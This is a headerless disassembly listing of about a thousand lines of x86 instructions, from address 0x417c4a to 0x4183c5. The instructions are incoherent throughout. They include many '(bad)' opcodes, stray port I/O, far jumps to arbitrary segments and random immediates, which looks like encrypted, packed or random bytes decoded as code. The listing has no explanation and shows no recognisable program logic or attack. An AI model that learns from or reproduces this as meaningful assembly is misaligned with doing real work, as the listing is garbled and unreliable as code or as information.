  417c4a:	sub    eax,0x1aba4615
  417c4f:	loopne 0x417c14
  417c51:	(bad)  
  417c52:	jo     0x417c89
  417c54:	(bad)  
  417c55:	test   eax,0xe7e62aae
  417c5a:	in     eax,0xc0
  417c5c:	icebp  
  417c5d:	cld    
  417c5e:	adc    bl,0x59
  417c61:	add    BYTE PTR [ebx+edx*4-0x61ebc194],bh
  417c68:	repz aad 0xb6
  417c6b:	push   ebx
  417c6c:	int3   
  417c6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c6e:	jmp    0xa5a2e395
  417c73:	shl    DWORD PTR [edx-0x4a],cl
  417c76:	es pop ss
  417c78:	lods   eax,DWORD PTR ds:[esi]
  417c79:	aad    0x57
  417c7b:	(bad)  
  417c7c:	fs mov bh,0x71
  417c7f:	jns    0x417cc1
  417c81:	retf   0x196
  417c84:	lods   al,BYTE PTR ds:[esi]
  417c85:	iret   
  417c86:	cld    
  417c87:	sar    DWORD PTR [eax+ebp*2],cl
  417c8a:	arpl   WORD PTR [edx+0x1780deb4],bx
  417c90:	ficom  DWORD PTR [edx]
  417c92:	sub    ebx,DWORD PTR [edi-0x69089a9a]
  417c98:	aaa    
  417c99:	(bad)  
  417c9a:	bound  ebx,QWORD PTR [eax-0x6e]
  417c9d:	mov    dl,dh
  417c9f:	shl    BYTE PTR [esi+0x7f],cl
  417ca2:	push   0xffffffa5
  417ca4:	jle    0x417caa
  417ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca7:	mov    DWORD PTR [edx+0x1e],ebp
  417caa:	scas   eax,DWORD PTR es:[edi]
  417cab:	test   eax,0x26a9d6a3
  417cb0:	jg     0x417cbd
  417cb2:	inc    esp
  417cb3:	jl     0x417ceb
  417cb5:	pop    edx
  417cb6:	jno    0x417c7b
  417cb8:	push   esp
  417cb9:	lock js 0x417d2e
  417cbc:	xor    al,cl
  417cbe:	jb     0x417c93
  417cc0:	iret   
  417cc1:	dec    ecx
  417cc2:	cmp    eax,0xdec1abcc
  417cc7:	and    eax,0xd3f1c092
  417ccc:	and    DWORD PTR [ecx+0x18640d],0xb516d3e8
  417cd6:	ja     0x417cfa
  417cd8:	jno    0x417cad
  417cda:	repz pop edi
  417cdc:	fisub  DWORD PTR [eax]
  417cde:	or     dl,0xd8
  417ce1:	rcr    BYTE PTR [esi+0x12],1
  417ce4:	scas   al,BYTE PTR es:[edi]
  417ce5:	(bad)  
  417ce6:	imul   ebx,DWORD PTR [edi+0x2d2524cc],0x7354c8e4
  417cf0:	xchg   ebx,eax
  417cf1:	mov    al,0xb1
  417cf3:	pop    ecx
  417cf4:	mov    dl,0x65
  417cf6:	aad    0x15
  417cf8:	cmc    
  417cf9:	aad    0xab
  417cfb:	and    BYTE PTR ds:0x78f76256,ah
  417d01:	add    BYTE PTR [ecx+0x35],dh
  417d04:	jl     0x417d2a
  417d06:	pop    esi
  417d07:	ins    DWORD PTR es:[edi],dx
  417d08:	push   eax
  417d09:	mov    ?,WORD PTR [ebx]
  417d0b:	aam    0x89
  417d0d:	mov    ebx,0xed5957b6
  417d12:	leave  
  417d13:	pop    eax
  417d14:	fnstcw WORD PTR [eax-0xf4c3c3e]
  417d1a:	and    WORD PTR [edx-0x6d2bb1c2],bp
  417d21:	test   al,0x4c
  417d23:	add    BYTE PTR gs:[ebx],bl
  417d26:	jmp    0x7017:0x5679da02
  417d2d:	fst    DWORD PTR [edi+edi*1-0x32]
  417d31:	fisub  DWORD PTR [edx+0x41cdc1d3]
  417d37:	in     al,dx
  417d38:	inc    esi
  417d39:	aas    
  417d3a:	and    cl,dl
  417d3c:	fidiv  DWORD PTR [edx]
  417d3e:	cmp    al,0x85
  417d40:	jae    0x417cd3
  417d42:	pop    edx
  417d43:	out    dx,al
  417d44:	in     al,dx
  417d45:	aad    0x56
  417d47:	jnp    0x417d28
  417d49:	aam    0x10
  417d4b:	mov    dl,0xa8
  417d4d:	and    DWORD PTR [ecx+0x41],esi
  417d50:	and    al,0xd1
  417d52:	cmc    
  417d53:	and    BYTE PTR [edx+ebp*8+0x5c35d3c1],dh
  417d5a:	lods   al,BYTE PTR ds:[esi]
  417d5b:	mov    dh,0x0
  417d5d:	inc    esi
  417d5e:	xor    cl,BYTE PTR [esi]
  417d60:	fcmovu st,st(5)
  417d62:	(bad)  
  417d63:	fstp   TBYTE PTR [ebp+0x67]
  417d66:	jmp    0x4792:0x93d6b912
  417d6d:	daa    
  417d6e:	add    eax,0x70f15df2
  417d73:	outs   dx,DWORD PTR ds:[esi]
  417d74:	inc    esi
  417d75:	dec    edx
  417d76:	aam    0xd9
  417d78:	jns    0x417d8d
  417d7a:	adc    dl,ah
  417d7c:	inc    ecx
  417d7d:	fidiv  WORD PTR [eax-0x2330d108]
  417d83:	(bad)  
  417d84:	fisub  DWORD PTR [ecx]
  417d86:	add    al,cl
  417d88:	mov    dl,0xf7
  417d8a:	rcr    DWORD PTR [esp+ebp*2],0xd6
  417d8e:	mov    al,0x5
  417d90:	test   al,0x54
  417d92:	push   cs
  417d93:	je     0x417dd8
  417d95:	shl    DWORD PTR [ecx+0x72],0x47
  417d99:	jge    0x417de0
  417d9b:	or     ecx,ebp
  417d9d:	shl    edi,cl
  417d9f:	rol    DWORD PTR [edx+0x2a901ed8],cl
  417da5:	mov    dl,0xd9
  417da7:	pop    edx
  417da8:	pop    edi
  417da9:	in     eax,0x6f
  417dab:	sbb    BYTE PTR [edx-0x29],0xd6
  417daf:	ins    DWORD PTR es:[edi],dx
  417db0:	test   BYTE PTR [edx-0x53],ah
  417db3:	es mov esp,0x2ecbad3
  417db9:	jbe    0x417e2b
  417dbb:	and    esp,DWORD PTR [ebx]
  417dbd:	(bad)  
  417dbe:	sbb    eax,0x70aaa8f6
  417dc3:	stos   BYTE PTR es:[edi],al
  417dc4:	sub    al,dh
  417dc6:	and    al,0xdb
  417dc8:	adc    eax,0x389aa112
  417dcd:	mov    bh,0x5
  417dcf:	xor    al,0x4f
  417dd1:	test   DWORD PTR [eax],0x8e3cbbd0
  417dd7:	adc    al,BYTE PTR [ebx+0x5cec2fef]
  417ddd:	imul   ebx,DWORD PTR [ecx],0xf1cb0739
  417de3:	cdq    
  417de4:	xor    eax,ecx
  417de6:	in     al,0x73
  417de8:	cmp    eax,0x523494fb
  417ded:	inc    esi
  417dee:	jl     0x417dbe
  417df0:	outs   dx,BYTE PTR ds:[esi]
  417df1:	fcmovnu st,st(1)
  417df3:	jbe    0x417e10
  417df5:	push   ss
  417df6:	mov    ecx,0xfd8b557e
  417dfb:	adc    ah,cl
  417dfd:	std    
  417dfe:	outs   dx,DWORD PTR ds:[esi]
  417dff:	jge    0x417e7b
  417e01:	not    BYTE PTR [ebp+0x42]
  417e04:	leave  
  417e05:	xchg   esp,eax
  417e06:	mov    ecx,DWORD PTR [ebx-0x3e8e4abf]
  417e0c:	xor    ch,cl
  417e0e:	shl    BYTE PTR [edi-0x5f],0x9e
  417e12:	jno    0x417e09
  417e14:	jo     0x417e72
  417e16:	pop    ecx
  417e17:	cld    
  417e18:	stos   BYTE PTR es:[edi],al
  417e19:	adc    esp,DWORD PTR [eax+0x695f65d3]
  417e1f:	mov    ecx,DWORD PTR [ecx+0x7e]
  417e22:	aas    
  417e23:	(bad)  
  417e24:	mov    dh,0x64
  417e26:	push   ds
  417e27:	adc    ebx,0xd
  417e2a:	adc    eax,0x21b30a1d
  417e2f:	sub    eax,DWORD PTR [eax-0x284f5086]
  417e35:	jbe    0x417e3e
  417e37:	cdq    
  417e38:	push   es
  417e39:	sbb    eax,eax
  417e3b:	inc    edx
  417e3c:	js     0x417de4
  417e3e:	or     esi,DWORD PTR [esi]
  417e40:	int3   
  417e41:	add    al,0x25
  417e43:	push   esi
  417e44:	int    0x16
  417e46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e47:	or     ch,BYTE PTR [edx+0x5a]
  417e4a:	xchg   ebp,eax
  417e4b:	shr    BYTE PTR [ebp-0x63],1
  417e4e:	push   edi
  417e4f:	imul   esp,DWORD PTR [ebx-0x67],0xffffff89
  417e53:	xchg   edi,eax
  417e54:	mov    dh,0x96
  417e56:	jnp    0x417e0e
  417e58:	xlat   BYTE PTR ds:[ebx]
  417e59:	xor    DWORD PTR [eax+0x7a050203],0x907e1937
  417e63:	inc    edx
  417e64:	jmp    0xb2d6:0x83d579bd
  417e6b:	loop   0x417e22
  417e6d:	pop    ebx
  417e6e:	and    ecx,ebx
  417e70:	push   ebx
  417e71:	mov    edi,0xd6aabb38
  417e76:	lahf   
  417e77:	cdq    
  417e78:	add    ebx,DWORD PTR [esi+0x7a]
  417e7b:	or     cl,BYTE PTR [ecx]
  417e7d:	(bad)  
  417e7e:	lea    esp,[eax]
  417e80:	adc    ebp,DWORD PTR [edx-0x63]
  417e83:	rep stos DWORD PTR es:[edi],eax
  417e85:	pop    edi
  417e86:	push   edx
  417e87:	push   eax
  417e88:	push   0x6d
  417e8a:	xor    edx,edi
  417e8c:	in     al,0x67
  417e8e:	sahf   
  417e8f:	imul   ecx,DWORD PTR [edx],0xffffffd6
  417e92:	popa   
  417e93:	sahf   
  417e94:	inc    edi
  417e95:	mov    al,0x13
  417e97:	addr16 xchg edx,eax
  417e99:	mov    DWORD PTR [esi+0x5c],ebp
  417e9c:	adc    eax,0xf6bcb6c9
  417ea1:	adc    al,0xf7
  417ea3:	pop    edi
  417ea4:	stos   BYTE PTR es:[edi],al
  417ea5:	ret    
  417ea6:	xor    DWORD PTR [ebx-0x18],ebx
  417ea9:	test   DWORD PTR ds:0xfc767c3e,edx
  417eaf:	xchg   ebx,eax
  417eb0:	dec    ebx
  417eb2:	push   ss
  417eb3:	mov    esp,0x8684f8ea
  417eb8:	hlt    
  417eb9:	adc    esi,ebx
  417ebb:	scas   al,BYTE PTR es:[edi]
  417ebc:	ficomp DWORD PTR [esp+esi*4]
  417ebf:	mov    ds:0x23507d8c,al
  417ec4:	cmp    esi,edx
  417ec6:	pop    esi
  417ec7:	lea    ebx,[ecx-0x47c3a121]
  417ecd:	mov    cl,0x77
  417ecf:	xchg   esp,eax
  417ed0:	and    dh,BYTE PTR fs:[ecx-0x38]
  417ed4:	pop    ebp
  417ed5:	clc    
  417ed6:	int    0xf9
  417ed8:	or     BYTE PTR [edi+eax*1+0x2081c8d4],0x99
  417ee0:	push   esp
  417ee1:	push   cs
  417ee2:	fimul  WORD PTR [ecx]
  417ee4:	fcom   DWORD PTR [esi+0x31a948]
  417eea:	arpl   sp,si
  417eec:	retf   
  417eed:	push   edi
  417eee:	adc    ebp,ecx
  417ef0:	call   0x889fca4e
  417ef5:	xchg   BYTE PTR [edx],ah
  417ef7:	sbb    dh,dl
  417ef9:	pop    eax
  417efa:	outs   dx,BYTE PTR ds:[esi]
  417efb:	or     eax,0xcb6e90e5
  417f00:	into   
  417f01:	sbb    edx,DWORD PTR [ebx-0x73a9a6fd]
  417f07:	aad    0x26
  417f09:	(bad)  
  417f0a:	idiv   BYTE PTR [ebp-0x73f56f66]
  417f10:	jb     0x417ed5
  417f12:	jno    0x417ed7
  417f14:	int3   
  417f15:	pop    ds
  417f16:	in     eax,dx
  417f17:	jbe    0x417eef
  417f19:	mov    eax,0x81f7d428
  417f1e:	pop    edi
  417f1f:	js     0x417ed4
  417f21:	lahf   
  417f22:	mov    bh,0x69
  417f24:	fisub  DWORD PTR [esi-0x2a47d619]
  417f2a:	loopne 0x417f17
  417f2c:	pop    esp
  417f2d:	(bad)  
  417f2e:	shl    DWORD PTR [ebx+0x6bbda100],cl
  417f34:	int3   
  417f35:	fbstp  TBYTE PTR [eax+0x19]
  417f38:	and    eax,0x98a80d5b
  417f3d:	ja     0x417eca
  417f3f:	rol    BYTE PTR [ecx+ebp*8],1
  417f42:	jb     0x417f79
  417f44:	inc    esi
  417f45:	sub    eax,0xbc92f072
  417f4a:	loop   0x417f38
  417f4c:	cs out 0x14,al
  417f4f:	lock push ebp
  417f51:	sti    
  417f52:	jo     0x417fac
  417f54:	popa   
  417f55:	and    ah,BYTE PTR [edx+0x25b4e01]
  417f5b:	leave  
  417f5c:	push   ss
  417f5d:	fbstp  TBYTE PTR [edx+0x12]
  417f60:	xlat   BYTE PTR ds:[ebx]
  417f61:	pop    edx
  417f62:	mov    edx,0xc174fa32
  417f67:	pushf  
  417f68:	fcmove st,st(7)
  417f6a:	pop    edi
  417f6b:	shl    DWORD PTR ds:0x47aebe3d,cl
  417f71:	rcr    DWORD PTR [edx+0x9202f1a],cl
  417f77:	add    BYTE PTR [ecx-0x4],bl
  417f7a:	xchg   ecx,eax
  417f7b:	out    0xff,eax
  417f7d:	in     eax,dx
  417f7e:	jo     0x417f61
  417f80:	lods   al,BYTE PTR ds:[esi]
  417f81:	pop    eax
  417f82:	xor    al,0x6a
  417f84:	pop    ecx
  417f85:	mov    eax,ds:0xe2a8bcf5
  417f8a:	pop    es
  417f8b:	aam    0xe3
  417f8d:	jp     0x417f7a
  417f8f:	add    dh,BYTE PTR [ebp+edx*8+0x70]
  417f93:	test   DWORD PTR [esi+0x4e],ecx
  417f96:	loope  0x417f32
  417f98:	sub    BYTE PTR [ecx-0x1d466fff],al
  417f9e:	xor    DWORD PTR [eax-0x2c5ae6fd],ebp
  417fa4:	and    al,0x6d
  417fa6:	sub    bh,cl
  417fa8:	jecxz  0x417f44
  417faa:	aaa    
  417fab:	scas   eax,DWORD PTR es:[edi]
  417fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fad:	dec    edi
  417fae:	or     dh,BYTE PTR [esi+eiz*2-0x1d]
  417fb2:	push   eax
  417fb3:	xor    esi,DWORD PTR [edi-0x14489c85]
  417fb9:	not    DWORD PTR [ecx]
  417fbb:	dec    ebp
  417fbc:	jecxz  0x417f6a
  417fbe:	loop   0x417fa3
  417fc0:	and    eax,0xeacade82
  417fc5:	jno    0x418038
  417fc7:	in     al,dx
  417fc8:	push   ecx
  417fc9:	adc    edi,DWORD PTR [ebx+0x75]
  417fcc:	pop    es
  417fcd:	mov    ch,0xd2
  417fcf:	shr    DWORD PTR [eax-0x219e7e5b],cl
  417fd5:	mov    dl,0xf7
  417fd7:	aas    
  417fd8:	in     al,0x72
  417fda:	push   0xf21bfb99
  417fdf:	shl    DWORD PTR [edi-0x16be8855],cl
  417fe5:	aam    0xb2
  417fe7:	jmp    0x6c5:0xbcc34a59
  417fee:	fwait
  417fef:	pop    es
  417ff0:	mov    esi,0x9a5395c5
  417ff5:	pop    es
  417ff6:	mov    esi,0x3b9af41a
  417ffb:	aam    0xf6
  417ffd:	nop
  417ffe:	int    0x3b
  418000:	inc    edi
  418001:	mov    ch,0xda
  418003:	test   eax,0xffe7fbbe
  418008:	sbb    bh,BYTE PTR [edi-0x43]
  41800b:	leave  
  41800c:	mov    ds:0xe4c57323,al
  418011:	add    bl,BYTE PTR [esi-0x3a]
  418014:	fidivr DWORD PTR [ebp+0x1c2ddee4]
  41801a:	jno    0x417fb4
  41801c:	popf   
  41801d:	sub    edi,DWORD PTR [ebp-0x7a]
  418020:	inc    edx
  418021:	or     edi,DWORD PTR [eax-0x49]
  418024:	in     al,0xdd
  418026:	jge    0x417fbb
  418028:	fwait
  418029:	mov    ebx,0xf321254e
  41802e:	jo     0x41803f
  418030:	xor    edx,DWORD PTR [ebx+ebp*8-0x4a]
  418034:	push   esi
  418035:	and    al,BYTE PTR [edx-0x64a6234]
  41803b:	ja     0x417fc9
  41803d:	push   ss
  41803e:	add    DWORD PTR gs:[eax],ebp
  418041:	outs   dx,DWORD PTR ds:[esi]
  418042:	jno    0x4180c2
  418044:	lea    ebp,[esi-0x3d3780fa]
  41804a:	xor    bh,BYTE PTR [eax+edx*8]
  41804d:	mov    edx,0x3a9f1b40
  418052:	repz xchg ebx,eax
  418054:	xchg   ecx,eax
  418055:	cmp    dl,BYTE PTR [edx+0x6381ef78]
  41805b:	or     eax,0xf384377c
  418060:	mov    eax,0xa1619bad
  418065:	iret   
  418066:	pop    ss
  418067:	sub    al,0x85
  418069:	jne    0x418013
  41806b:	jecxz  0x41808b
  41806d:	fcomp  DWORD PTR [esp+edi*1+0x484a11da]
  418074:	neg    DWORD PTR [edi+0x6a]
  418077:	add    eax,0x7c57cb41
  41807c:	inc    edx
  41807d:	mov    eax,ds:0x779c09f1
  418082:	loopne 0x41807e
  418084:	dec    edx
  418085:	push   ecx
  418086:	neg    al
  418088:	xlat   BYTE PTR ds:[ebx]
  418089:	adc    esi,ecx
  41808b:	cmc    
  41808c:	push   es
  41808d:	stos   DWORD PTR es:[edi],eax
  41808e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41808f:	dec    ebx
  418090:	into   
  418091:	xchg   ecx,eax
  418092:	push   esp
  418093:	mov    bh,0x29
  418095:	push   ecx
  418096:	adc    ebx,0x65
  418099:	jmp    0x41810f
  41809b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41809c:	xlat   BYTE PTR ds:[ebx]
  41809d:	clc    
  41809e:	jo     0x418056
  4180a0:	neg    ah
  4180a2:	lock cmp ebx,DWORD PTR [esp+eax*1-0x1b6b2bee]
  4180aa:	mov    bh,0x15
  4180ac:	pop    esp
  4180ad:	lock push ds
  4180af:	inc    ebx
  4180b0:	(bad)  
  4180b2:	pop    ebx
  4180b3:	stos   DWORD PTR es:[edi],eax
  4180b4:	mov    ecx,0x97543d13
  4180b9:	(bad)  
  4180ba:	loope  0x41811a
  4180bc:	mov    esp,0x576316d2
  4180c1:	xchg   ebp,eax
  4180c2:	div    DWORD PTR [ebx-0x27]
  4180c5:	cmp    BYTE PTR [ebx+0x43],al
  4180c8:	into   
  4180c9:	mov    dl,0x32
  4180cb:	xchg   dl,bh
  4180cd:	push   edi
  4180ce:	sahf   
  4180cf:	repnz or ebx,DWORD PTR [esi]
  4180d2:	fs xchg esi,eax
  4180d4:	inc    esp
  4180d5:	(bad)  
  4180d6:	mov    ecx,0x7ec5f38a
  4180db:	xor    al,0xe0
  4180dd:	sti    
  4180de:	jo     0x41813f
  4180e0:	sahf   
  4180e1:	int3   
  4180e2:	and    DWORD PTR [ebp+ebx*1+0x6b63133c],ebp
  4180e9:	(bad)  
  4180ea:	jns    0x4180ca
  4180ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180ed:	outs   dx,BYTE PTR ds:[esi]
  4180ee:	ffreep st(0)
  4180f0:	inc    ebp
  4180f1:	popa   
  4180f2:	ins    BYTE PTR es:[edi],dx
  4180f3:	and    DWORD PTR [ebp+ebx*2-0x26],ebx
  4180f7:	mov    ebx,DWORD PTR [edx]
  4180f9:	out    dx,eax
  4180fa:	ins    DWORD PTR es:[edi],dx
  4180fb:	les    esp,FWORD PTR [edi-0x2a]
  4180fe:	mov    ch,0x3f
  418100:	div    edi
  418102:	pop    edi
  418103:	xor    DWORD PTR gs:[ebp+0x71],0x48
  418108:	sbb    al,0x35
  41810a:	push   esi
  41810b:	dec    esi
  41810c:	inc    edx
  41810d:	test   bh,ch
  41810f:	shl    ebp,cl
  418111:	jecxz  0x418125
  418113:	sub    BYTE PTR [edi],al
  418115:	mov    al,0xce
  418117:	sbb    edx,ebx
  418119:	mov    bh,0xa
  41811b:	das    
  41811c:	nop
  41811d:	test   DWORD PTR [ebp-0x11121bc3],0xc5663fc5
  418127:	lock pop edx
  418129:	cld    
  41812a:	iret   
  41812b:	outs   dx,BYTE PTR ds:[esi]
  41812c:	add    DWORD PTR [ebx],ebx
  41812e:	jo     0x418172
  418130:	push   cs
  418131:	into   
  418132:	or     BYTE PTR [ecx+0x4f],0xc9
  418136:	jno    0x41812f
  418138:	sbb    al,0xba
  41813a:	ins    BYTE PTR es:[edi],dx
  41813b:	and    al,0x8e
  41813d:	mov    ch,0xa6
  41813f:	pop    ebx
  418140:	sbb    dl,BYTE PTR [edx]
  418142:	loop   0x4180de
  418144:	mov    dh,0x3e
  418146:	enter  0x2a32,0xdf
  41814a:	add    BYTE PTR [edi],dh
  41814c:	push   ecx
  41814d:	(bad)  
  41814e:	xchg   edi,eax
  41814f:	in     eax,0xdc
  418151:	dec    esi
  418152:	pop    ebx
  418153:	retf   0x1029
  418156:	jno    0x4180e6
  418158:	hlt    
  418159:	add    ah,BYTE PTR [ebx]
  41815b:	cs dec edi
  41815d:	fdivr  QWORD PTR [esi+0x3ebac5d3]
  418163:	pop    esp
  418164:	push   0xffffffe6
  418166:	jle    0x41817d
  418168:	(bad)  
  41816a:	fisttp WORD PTR [ebx]
  41816c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41816d:	cmp    cl,dl
  41816f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418170:	add    dl,dh
  418172:	push   es
  418173:	scas   al,BYTE PTR es:[edi]
  418174:	inc    esp
  418175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418176:	out    dx,al
  418177:	sub    ch,BYTE PTR [edx]
  418179:	jle    0x4181ec
  41817b:	inc    ecx
  41817c:	cs mov ah,0xa2
  41817f:	cs mov edi,0xd6cd18d5
  418185:	neg    BYTE PTR [ebp+0x595f6b11]
  41818b:	test   BYTE PTR [esi],dh
  41818d:	int3   
  41818e:	repz (bad) 
  418190:	fisubr DWORD PTR [ecx]
  418192:	lea    ebx,[esi]
  418194:	je     0x418209
  418196:	dec    BYTE PTR [ebx]
  418198:	enter  0xadd3,0x76
  41819c:	push   edi
  41819d:	(bad)  
  41819e:	in     eax,dx
  41819f:	inc    edx
  4181a0:	and    ah,BYTE PTR [eax-0x723012f4]
  4181a6:	add    DWORD PTR [edx],0x211f4eed
  4181ac:	dec    edx
  4181ad:	adc    eax,0xd69c08db
  4181b2:	jge    0x4181b5
  4181b4:	dec    ecx
  4181b5:	lock ss aad 0x51
  4181b9:	dec    edi
  4181ba:	jno    0x4181eb
  4181bc:	outs   dx,DWORD PTR ds:[esi]
  4181bd:	ja     0x4181b9
  4181bf:	sub    DWORD PTR [ecx+eiz*8+0x1578d0ea],esi
  4181c6:	out    dx,eax
  4181c7:	mov    ebp,0x44794a29
  4181cc:	push   ds
  4181cd:	cmp    BYTE PTR [ecx-0x14],dh
  4181d0:	ret    0xf386
  4181d3:	xchg   ebp,eax
  4181d4:	pop    edx
  4181d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181d6:	jp     0x41824f
  4181d8:	sbb    eax,0x985b71b0
  4181dd:	cld    
  4181de:	xlat   BYTE PTR ds:[ebx]
  4181df:	loopne 0x418198
  4181e1:	(bad)  
  4181e2:	jno    0x41816e
  4181e4:	or     BYTE PTR [esi],dl
  4181e6:	loope  0x4181a2
  4181e8:	mov    ds:0x8dd0f73e,al
  4181ed:	test   BYTE PTR [ecx],dh
  4181ef:	aas    
  4181f0:	hlt    
  4181f1:	stos   BYTE PTR es:[edi],al
  4181f2:	shl    DWORD PTR ds:0x6c6cd1a0,0x70
  4181f9:	es pop ebp
  4181fb:	or     eax,0xe2823b1a
  418200:	ret    0x3ed6
  418203:	mov    dl,0x21
  418205:	adc    BYTE PTR [edi],ch
  418207:	xchg   edi,eax
  418208:	cdq    
  418209:	lds    esi,FWORD PTR [ecx-0x32]
  41820c:	arpl   dx,di
  41820e:	rcr    BYTE PTR [eax+0x59b77d04],cl
  418214:	xchg   BYTE PTR [edi-0x6a046b9f],dh
  41821a:	into   
  41821b:	pop    es
  41821c:	inc    ecx
  41821d:	mov    edx,0x8fd9443d
  418222:	(bad)  [edi-0x70856609]
  418228:	jp     0x418240
  41822a:	mov    al,ds:0xce35bbce
  41822f:	neg    cl
  418231:	(bad)  
  418232:	icebp  
  418233:	fadd   DWORD PTR [edi-0x2536e930]
  418239:	sub    al,0x77
  41823b:	ds cmp al,0x39
  41823f:	ja     0x418207
  418241:	(bad)  
  418242:	aaa    
  418243:	enter  0x527,0x2a
  418247:	mov    dh,0x99
  418249:	inc    esi
  41824a:	jno    0x418212
  41824c:	push   esp
  41824d:	jo     0x4182c1
  41824f:	cmp    ebp,DWORD PTR [ebx-0x75]
  418252:	and    edx,esp
  418254:	outs   dx,DWORD PTR ds:[esi]
  418255:	loopne 0x41828b
  418257:	and    eax,DWORD PTR [ebx+0x3b]
  41825a:	jns    0x41829a
  41825c:	(bad)  
  41825e:	and    esi,DWORD PTR [ecx+0x56]
  418261:	ret    
  418262:	nop
  418263:	push   ss
  418264:	std    
  418265:	aad    0x87
  418267:	shr    BYTE PTR [edi+ecx*1+0x4c23c9ee],1
  41826e:	jno    0x41825e
  418270:	mov    ch,0x3a
  418272:	cmp    eax,0x6b91f3fc
  418277:	aam    0x15
  418279:	loopne 0x418278
  41827b:	ss jbe 0x418255
  41827e:	add    ah,ah
  418280:	xlat   BYTE PTR ds:[ebx]
  418281:	add    al,0xad
  418283:	push   esi
  418284:	dec    edx
  418285:	add    BYTE PTR [ebp+0x24],bl
  418288:	and    edx,DWORD PTR [eax+0x63]
  41828b:	aam    0x8c
  41828d:	cmc    
  41828e:	fs aas 
  418290:	outs   dx,BYTE PTR ds:[esi]
  418291:	or     al,0x28
  418293:	or     ebx,edx
  418295:	sbb    dh,BYTE PTR [ebp-0xc]
  418298:	rol    ebp,1
  41829a:	mov    eax,ds:0xccd622fa
  41829f:	xchg   edx,eax
  4182a0:	(bad)  
  4182a1:	add    edx,DWORD PTR [eax]
  4182a3:	jecxz  0x4182bf
  4182a5:	(bad)  
  4182a6:	jno    0x418288
  4182a8:	aaa    
  4182a9:	mov    dh,0x99
  4182ab:	call   0xd4449719
  4182b0:	xchg   esp,eax
  4182b1:	test   al,0x67
  4182b3:	das    
  4182b4:	pop    edx
  4182b5:	not    edi
  4182b7:	fdivr  QWORD PTR [esi-0x65ddbd78]
  4182bd:	call   0x99bcd7ee
  4182c2:	mov    ds:0x4bfd77a5,eax
  4182c7:	cdq    
  4182c8:	ficom  DWORD PTR [ebp-0x15]
  4182cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182cc:	sub    ebp,DWORD PTR [ebp-0x4f]
  4182cf:	xchg   ebp,eax
  4182d0:	ficom  DWORD PTR [edx]
  4182d2:	leave  
  4182d3:	leave  
  4182d4:	rcr    DWORD PTR [esi+0xa],cl
  4182d7:	rcr    DWORD PTR [ebx-0x2a],0xa1
  4182db:	fadd   QWORD PTR [edi+0xd]
  4182de:	loope  0x4182c1
  4182e0:	push   edx
  4182e1:	jbe    0x418354
  4182e3:	lea    ebp,[ecx]
  4182e5:	mov    eax,0x1324c859
  4182ea:	push   edi
  4182eb:	cdq    
  4182ec:	or     BYTE PTR [eax+0x7e0bedea],dl
  4182f2:	sbb    al,0x4
  4182f4:	mov    esi,0xdafb2c37
  4182f9:	loop   0x4182d4
  4182fb:	(bad)  
  4182fc:	push   ds
  4182fd:	push   eax
  4182fe:	loop   0x418345
  418300:	and    al,cl
  418302:	cmp    eax,0xb11664ec
  418307:	in     eax,0x65
  418309:	push   0x7dda81ff
  41830e:	mov    al,ds:0xb22f1655
  418313:	in     al,0x51
  418315:	(bad)  
  418316:	outs   dx,BYTE PTR ds:[esi]
  418317:	outs   dx,BYTE PTR ds:[esi]
  418318:	retf   0x9dbe
  41831b:	xor    DWORD PTR [edx],esp
  41831d:	and    BYTE PTR [esp+edx*1-0x1b],ch
  418321:	(bad)  
  418322:	lock mov ds:0x7730b91a,al
  418328:	test   al,0xd3
  41832a:	ja     0x4182b7
  41832c:	int3   
  41832d:	sbb    cl,BYTE PTR [edx]
  41832f:	xor    BYTE PTR [edx+0x74],al
  418332:	or     ebp,DWORD PTR [edx+ebx*8+0x3a9cf137]
  418339:	lea    edx,[ebp-0x6b2a1152]
  41833f:	lods   eax,DWORD PTR ds:[esi]
  418340:	xchg   esi,eax
  418341:	adc    dh,dl
  418343:	out    dx,al
  418344:	mov    DWORD PTR [esi],edx
  418346:	jno    0x4183b1
  418348:	add    al,0xfe
  41834a:	add    BYTE PTR [ecx+0x6],0x2e
  41834e:	or     esp,DWORD PTR [ecx+0x11]
  418351:	(bad)  
  418352:	mov    eax,ds:0x29d39781
  418357:	fmul   st(5),st
  418359:	jns    0x4183cc
  41835b:	mov    dh,0xc1
  41835d:	adc    eax,0x48b55efb
  418362:	sbb    eax,0x2e1914c2
  418367:	aam    0x17
  418369:	add    ch,BYTE PTR [eax+edi*8+0x57]
  41836d:	xor    esi,DWORD PTR [ecx-0x2]
  418370:	sub    dh,BYTE PTR [eax+0x47]
  418373:	cmp    dh,BYTE PTR [edi-0x1e]
  418376:	adc    eax,0xffffff95
  418379:	sbb    BYTE PTR [edi],dl
  41837b:	retf   0x67ae
  41837e:	add    DWORD PTR [edx+0x72],0xa046f690
  418385:	adc    DWORD PTR [esi+0x38fd3d53],esi
  41838b:	mov    dl,0x6e
  41838d:	fstp   QWORD PTR [esi]
  41838f:	aam    0xf
  418391:	xchg   edx,eax
  418392:	outs   dx,BYTE PTR ds:[esi]
  418393:	xor    DWORD PTR [ebx+0x6a1a2c78],ebp
  418399:	cdq    
  41839a:	jno    0x4183d4
  41839c:	xchg   edx,eax
  41839d:	and    bl,BYTE PTR [esi+0x22]
  4183a0:	or     al,BYTE PTR [eax-0xb182be4]
  4183a6:	mov    ss,WORD PTR [edi+0x6]
  4183a9:	xchg   edi,edi
  4183ab:	inc    ebx
  4183ac:	xlat   BYTE PTR ds:[ebx]
  4183ad:	rcr    DWORD PTR [ebp+0x6f],1
  4183b0:	mov    al,0x27
  4183b2:	stc    
  4183b3:	sar    DWORD PTR [ebp+esi*4-0x40bb6521],cl
  4183ba:	dec    eax
  4183bb:	or     ebx,ecx
  4183bd:	ror    BYTE PTR [esi],cl
  4183bf:	rcl    DWORD PTR [esi-0x2535eae7],1
  4183c5:	popa   
